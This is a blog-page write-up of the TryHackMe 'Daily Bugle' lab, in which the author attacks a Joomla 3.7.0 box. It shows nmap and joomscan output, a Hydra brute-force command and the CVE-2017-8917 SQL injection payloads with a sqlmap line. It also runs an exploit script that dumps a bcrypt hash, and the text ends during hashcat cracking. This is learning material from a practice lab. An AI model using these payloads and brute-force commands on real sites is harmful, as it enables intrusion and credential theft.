<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/dailybugle_writeup/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
       <meta property="og:title" content="DailyBugle_writeup.sh" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/dailybugle_writeup/" /><meta property="article:published_time" content="2020-08-28T22:07:08-04:00" />



<meta name="twitter:title" content="DailyBugle_writeup.sh"/>
<meta name="twitter:description" content="Daily Bugle - THM Room This is a writeup or another one of my noob friendly(I hope) post-thingy for Daily Bugle TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. Yup, I also write down my failed attempts to better illustrate my derailed train of thought.
You have been warned :)
Enjoy!
 Please visit This room on TryHackMe by clicking this link."/>

</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/dailybugle_writeup'>dailybugle_writeup</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>DailyBugle_writeup.sh</h1>
Aug. 28, 2020


<br/><br/>
<img src="../img/dailyBugle_cover.gif" alt="Post Cover Gif animation";>
<br/><br/>
<h1 id="daily-bugle---thm-room">Daily Bugle - THM Room</h1>
<p>This is a writeup or another one of my noob friendly(I hope) post-thingy for Daily Bugle TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. Yup, I also write down my failed attempts to better illustrate my derailed train of thought.</p>
<p>You have been warned :)</p>
<p>Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/dailybugle">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally redacted as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
</ul>
<h2 id="task-1-deploy">[TASK 1] Deploy</h2>
<blockquote>
<p>Question #1: Access the web server, who robbed the bank?</p>
</blockquote>
<p>Let&rsquo;s start as usual by running an nmap scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ nmap -A -T4 10.10.179.65 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-27 12:40 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.179.65
Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp   open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.6.40<span style="color:#f92672">)</span>
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: <span style="color:#ae81ff">15</span> disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 36.17 seconds

</code></pre></div><p>Let&rsquo;s see whats being served on port 80:</p>
<p><img src="https://i.imgur.com/C4X3R75.png" alt="Daily Bugle Home page"></p>
<p>The information on this page gives us the answer to the first question.</p>
<h2 id="task-2-obtain-user-and-root">[Task 2] Obtain user and root</h2>
<blockquote>
<p>Question #1 What is the Joomla Version?</p>
</blockquote>
<p>There is no visible information on the page that reveals the version. We can look into the source code, but before we do that. Let&rsquo;s capture with Burp a login request and put Hydra to work on trying to brute force access for us:</p>
<p>This is the request as captured in Burp:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">POST /index.php/component/users/?task<span style="color:#f92672">=</span>user.login&amp;Itemid<span style="color:#f92672">=</span><span style="color:#ae81ff">101</span> HTTP/1.1
Host: 10.10.179.65
Content-Length: <span style="color:#ae81ff">169</span>
Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
Origin: http://10.10.179.65
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.9
Referer: http://10.10.179.65/index.php/component/users/?view<span style="color:#f92672">=</span>login&amp;Itemid<span style="color:#f92672">=</span><span style="color:#ae81ff">101</span>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
Cookie: eaa83fe8b963ab08ce9ab7d4a798de05<span style="color:#f92672">=</span>egb2jrelr81kl1mi493gfkf544; 2b01af51830ca9615359108de04d9ca1<span style="color:#f92672">=</span>ulpsk0o9dmfa0ms8ebohvbs0n5
Connection: close

username<span style="color:#f92672">=</span>spiderman&amp;password<span style="color:#f92672">=</span>test&amp;<span style="color:#66d9ef">return</span><span style="color:#f92672">=</span>aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvY29tcG9uZW50L3VzZXJzLz92aWV3PWxvZ2luJkl0ZW1pZD0xMDE%3D&amp;0ba84fa157b8f604f997575d184e2636<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>With this info let&rsquo;s put together an hydra attack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.179.65 http-post-form <span style="color:#e6db74">&#34;/index.php/component/users/?task=user.login&amp;Itemid=101:username=^USER^&amp;password=^PASS^&amp;Submit=&amp;option=com_users&amp;task=user.login&amp;return=aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvMi11bmNhdGVnb3Jpc2VkLzEtc3BpZGVyLW1hbi1yb2JzLWJhbms%3D&amp;9b46f637d905f7985fcefd95b0e502de=1:F=Username and password do not match or you do not have an account yet.&#34;</span> -V 
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-27 12:59:33
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">11862817973</span> login tries <span style="color:#f92672">(</span>l:827/p:14344399<span style="color:#f92672">)</span>, ~741426124 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.207.42:80/index.php:username<span style="color:#f92672">=</span>^USER^&amp;password<span style="color:#f92672">=</span>^PASS^&amp;Submit<span style="color:#f92672">=</span>&amp;option<span style="color:#f92672">=</span>com_users&amp;task<span style="color:#f92672">=</span>user.login&amp;<span style="color:#66d9ef">return</span><span style="color:#f92672">=</span>aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvMi11bmNhdGVnb3Jpc2VkLzEtc3BpZGVyLW1hbi1yb2JzLWJhbms%3D&amp;9b46f637d905f7985fcefd95b0e502de<span style="color:#f92672">=</span>1:F<span style="color:#f92672">=</span>Username and password <span style="color:#66d9ef">do</span> not match or you <span style="color:#66d9ef">do</span> not have an account yet.
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;!root&#34;</span> - pass <span style="color:#e6db74">&#34;123456&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">11862817973</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;!root&#34;</span> - pass <span style="color:#e6db74">&#34;12345&#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">11862817973</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;!root&#34;</span> - pass <span style="color:#e6db74">&#34;123456789&#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">11862817973</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>

</code></pre></div><p>That attack will take a while, let&rsquo;s check the source code of the site to see if it reaveals the version somewhere.
Spoiler alert! The source code revealed nothing. However, we still now it is running Joomla.</p>
<p>Let&rsquo;s fire up a <strong>joomscan</strong> scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">    ____  _____  _____  __  __  ___   ___    __    _  _ 
   <span style="color:#f92672">(</span>_  _<span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  <span style="color:#ae81ff">\/</span>  <span style="color:#f92672">)</span>/ __<span style="color:#f92672">)</span> / __<span style="color:#f92672">)</span>  /__<span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span> <span style="color:#ae81ff">\(</span> <span style="color:#f92672">)</span>
  .-_<span style="color:#f92672">)(</span>   <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)</span>    <span style="color:#f92672">(</span> <span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\(</span> <span style="color:#f92672">(</span>__  /<span style="color:#f92672">(</span>__<span style="color:#f92672">)</span><span style="color:#ae81ff">\ </span> <span style="color:#f92672">)</span>  <span style="color:#f92672">(</span> 
  <span style="color:#ae81ff">\_</span>___<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>_____<span style="color:#f92672">)(</span>_____<span style="color:#f92672">)(</span>_/<span style="color:#ae81ff">\/\_</span><span style="color:#f92672">)(</span>___/ <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>_<span style="color:#f92672">)</span><span style="color:#ae81ff">\_</span><span style="color:#f92672">)</span>
                        <span style="color:#f92672">(</span>1337.today<span style="color:#f92672">)</span>
   
    --<span style="color:#f92672">=[</span>OWASP JoomScan
    +---++---<span style="color:#f92672">==[</span>Version : 0.0.7
    +---++---<span style="color:#f92672">==[</span>Update Date : <span style="color:#f92672">[</span>2018/09/23<span style="color:#f92672">]</span>
    +---++---<span style="color:#f92672">==[</span>Authors : Mohammad Reza Espargham , Ali Razmjoo
    --<span style="color:#f92672">=[</span>Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.179.65 ...

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> FireWall Detector
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Firewall not detected
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Detecting Joomla Version
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Joomla <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>                              
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Core Joomla Vulnerability              
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Target Joomla core is not vulnerable                                                                                                                                                                         
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking Directory Listing       
http://10.10.179.65/administrator/components
http://10.10.179.65/administrator/modules
http://10.10.179.65/administrator/templates
http://10.10.179.65/images/banners   
                                                                                                                                                       
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking apache info/status files
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Readable info/status files are not found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin finder                    
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Admin page: http://10.10.179.65/administrator/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking robots.txt existing      
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> robots.txt is found           
path : http://10.10.179.65/robots.txt
                                                                                                                                                                                     
Interesting path found from robots.txt
http://10.10.179.65/joomla/administrator/   
http://10.10.179.65/administrator/          
http://10.10.179.65/bin/          
http://10.10.179.65/cache/          
http://10.10.179.65/cli/          
http://10.10.179.65/components/          
http://10.10.179.65/includes/          
http://10.10.179.65/installation/          
http://10.10.179.65/language/          
http://10.10.179.65/layouts/          
http://10.10.179.65/libraries/          
http://10.10.179.65/logs/          
http://10.10.179.65/modules/          
http://10.10.179.65/plugins/          
http://10.10.179.65/tmp/          
                              
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding common backup files name
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Backup files are not found    
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding common log files name 
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> error log is not found        
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking sensitive config.php.x file
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Readable config files are not found

Your Report : reports/10.10.179.65/         
</code></pre></div><p>And with that we get the Joomla version. Also it is worth mentionning that the <strong>hydra</strong> attack attempt did not work:</p>
<pre><code>- Me: maybe I did something wrong?
- The voice in my head: Most likely.
</code></pre>
<h2 id="task-2-question-2-what-is-jonahs-cracked-password">[Task 2] Question #2: What is Jonah&rsquo;s cracked password?</h2>
<p>If we search for joomla exploits for the version we found, we see there is a couple available:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ searchsploit joomla <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>- <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection                                                         | php/webapps/<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>.txt
Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                          | php/webapps/43488.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div><p>The first one seems to be exactly for the version we have. Let&rsquo;s open it up to see what it is about:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Exploit Title: Joomla 3.7.0 - Sql Injection</span>
<span style="color:#75715e"># Date: 05-19-2017</span>
<span style="color:#75715e"># Exploit Author: Mateus Lino</span>
<span style="color:#75715e"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span>
<span style="color:#75715e"># Vendor Homepage: https://www.joomla.org/</span>
<span style="color:#75715e"># Version: = 3.7.0</span>
<span style="color:#75715e"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span>
<span style="color:#75715e"># CVE : - CVE-2017-8917</span>


URL Vulnerable: http://localhost/index.php?option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=</span>updatexml%27


Using Sqlmap: 

sqlmap -u <span style="color:#e6db74">&#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>


Parameter: list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>DUAL<span style="color:#f92672">)</span>
    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>CASE WHEN <span style="color:#f92672">(</span>1573<span style="color:#f92672">=</span>1573<span style="color:#f92672">)</span> THEN <span style="color:#ae81ff">1573</span> ELSE 1573*<span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">1573</span> FROM DUAL UNION SELECT <span style="color:#ae81ff">9674</span> FROM DUAL<span style="color:#f92672">)</span> END<span style="color:#f92672">)</span>

    Type: error-based
    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0 error-based - Parameter replace <span style="color:#f92672">(</span>FLOOR<span style="color:#f92672">)</span>
    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>SELECT <span style="color:#ae81ff">6600</span> FROM<span style="color:#f92672">(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span>,CONCAT<span style="color:#f92672">(</span>0x7171767071,<span style="color:#f92672">(</span>SELECT <span style="color:#f92672">(</span>ELT<span style="color:#f92672">(</span>6600<span style="color:#f92672">=</span>6600,1<span style="color:#f92672">)))</span>,0x716a707671,FLOOR<span style="color:#f92672">(</span>RAND<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>*2<span style="color:#f92672">))</span>x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x<span style="color:#f92672">)</span>a<span style="color:#f92672">)</span>

    Type: AND/OR time-based blind
    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 time-based blind - Parameter replace <span style="color:#f92672">(</span>substraction<span style="color:#f92672">)</span>
    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>SELECT * FROM <span style="color:#f92672">(</span>SELECT<span style="color:#f92672">(</span>SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)))</span>GDiu<span style="color:#f92672">)</span>

</code></pre></div><p>It seems we can exploit this version by using a SQLMap commnad. However, while searching for the CVE Number related to this vulnerability we see there is a python script available. Which could be what the room suggests instead of goind the SQLi way. Let&rsquo;s look at that first.</p>
<ul>
<li>Download the Script: From <a href="https://github.com/XiphosResearch/exploits/tree/master/Joomblah">this link</a>.</li>
</ul>
<p>Please be aware that in order for this script to work I had to install the following first:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo apt install python-pip -y
pip install requests
</code></pre></div><p>Then I was able to execute the script, it was quite fast and just required the URL:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ python joomblah.py http://10.10.61.166:80
                                                                                                                                                                                                                            
    .---.    .-<span style="color:#e6db74">&#39;&#39;&#39;-.        .-&#39;&#39;&#39;</span>-.                                                           
    |   |   <span style="color:#e6db74">&#39;   _    \     &#39;</span>   _    <span style="color:#ae81ff">\ </span>                           .---.                        
    <span style="color:#e6db74">&#39;---&#39;</span> /   /<span style="color:#e6db74">`</span> <span style="color:#e6db74">&#39;.   \  /   /` &#39;</span>.   <span style="color:#ae81ff">\ </span> __  __   ___   /|        |   |            .           
    .---..   |     <span style="color:#ae81ff">\ </span> <span style="color:#e6db74">&#39; .   |     \  &#39;</span> |  |/  <span style="color:#e6db74">`</span>.<span style="color:#e6db74">&#39;   `. ||        |   |          .&#39;</span>|           
    |   <span style="color:#f92672">||</span>   <span style="color:#e6db74">&#39;      |  &#39;</span>|   <span style="color:#e6db74">&#39;      |  &#39;</span>|   .-.  .-.   <span style="color:#e6db74">&#39;||        |   |         &lt;  |           
</span><span style="color:#e6db74">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
</span><span style="color:#e6db74">    |   | `.   ` ..&#39;</span> /   <span style="color:#e6db74">`</span>.   <span style="color:#e6db74">`</span> ..<span style="color:#e6db74">&#39; /  |  |  |  |  |  |||/&#39;</span>__ <span style="color:#e6db74">&#39;. |   | .:--.&#39;</span>.  | | .<span style="color:#e6db74">&#39;&#39;&#39;-.    
</span><span style="color:#e6db74">    |   |    &#39;</span>-...-<span style="color:#e6db74">&#39;`       &#39;</span>-...-<span style="color:#e6db74">&#39;`   |  |  |  |  |  ||:/`  &#39;</span>. <span style="color:#e6db74">&#39;|   |/ |   \ | | |/.&#39;&#39;&#39;</span>. <span style="color:#ae81ff">\ </span>  
    |   |                              |  |  |  |  |  <span style="color:#f92672">||</span>|     | <span style="color:#f92672">||</span>   |<span style="color:#e6db74">`</span><span style="color:#e6db74">&#34; __ | | |  /    | |   
</span><span style="color:#e6db74">    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
</span><span style="color:#e6db74"> __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
</span><span style="color:#e6db74">|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
</span><span style="color:#e6db74">|____.&#39;                                                                `--&#39;  `&#34;</span> <span style="color:#e6db74">&#39;---&#39;</span>   <span style="color:#e6db74">&#39;---&#39;</span> 

 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching CSRF token
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 <span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> Found user <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;811&#39;</span>, <span style="color:#e6db74">&#39;Super User&#39;</span>, <span style="color:#e6db74">&#39;jonah&#39;</span>, <span style="color:#e6db74">&#39;jonah@tryhackme.com&#39;</span>, <span style="color:#e6db74">&#39;$2y$10$0veO/{REDACTED}VMw.V.d3p12kBtZutm&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">]</span>
  -  Extracting sessions from fb9j5_session

</code></pre></div><p>The script gives us the password hash, let&rsquo;s use <strong>hashcat</strong> to try and crack it. Save the extracted hash to a file and then let&rsquo;s try to detect which hash type we are dealing with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hashid <span style="color:#e6db74">&#39;$2y$10$0veO/{REDACTED}jVMw.V.d3p12kBtZutm&#39;</span>         
Analyzing <span style="color:#e6db74">&#39;$2y$10$0veO/{REDACTED}VMw.V.d3p12kBtZutm&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt 

</code></pre></div><p>Now let&rsquo;s try to crack it with hashcat, this might take a <strong>while</strong> depending your system, seriously. But eventually we&rsquo;ll get it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hashcat -m3200 -a0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat <span style="color:#f92672">(</span>v6.1.1<span style="color:#f92672">)</span> starting...

OpenCL API <span style="color:#f92672">(</span>OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
<span style="color:#f92672">=============================================================================================================================</span>
* Device <span style="color:#75715e">#1: pthread-AMD Ryzen 7 3800X 8-Core Processor, 10871/10935 MB (4096 MB allocatable), 6MCU</span>

Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
Maximum password length supported by kernel: <span style="color:#ae81ff">72</span>

Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
Rules: <span style="color:#ae81ff">1</span>

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">65</span> MB

Dictionary cache built:
